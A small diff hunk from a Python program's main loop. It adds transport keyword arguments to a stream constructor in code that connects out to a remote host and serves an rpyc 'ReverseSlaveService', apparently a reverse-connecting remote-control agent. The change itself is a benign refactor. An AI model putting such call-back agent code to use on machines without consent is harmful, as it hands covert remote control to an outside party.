@@ -142,7 +142,7 @@ def main():
 			t=transports[TRANSPORT]
 			client=t['client'](**t['client_kwargs'])
 			s=client.connect(rhost, rport)
-			stream = t['stream'](s, t['client_transport'])
+			stream = t['stream'](s, t['client_transport'], t['client_transport_kwargs'])
 			conn=rpyc.utils.factory.connect_stream(stream, ReverseSlaveService, {})
 			while True:
 				attempt=0
